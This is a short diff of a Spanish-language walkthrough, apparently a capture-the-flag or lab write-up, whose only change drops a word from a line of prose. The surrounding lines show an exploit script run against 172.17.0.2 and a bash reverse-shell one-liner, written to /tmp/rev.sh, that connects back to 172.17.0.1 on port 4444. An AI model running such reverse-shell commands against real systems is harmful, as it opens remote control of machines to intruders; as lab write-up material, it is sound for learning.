@@ -160,7 +160,7 @@ ejecuto el script
 ```bash
 python exploit2 -t 172.17.0.2
 ```
-creo un script en /tmp
+creo un script /tmp
 ```bash
 echo "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 " > /tmp/rev.sh
 ```
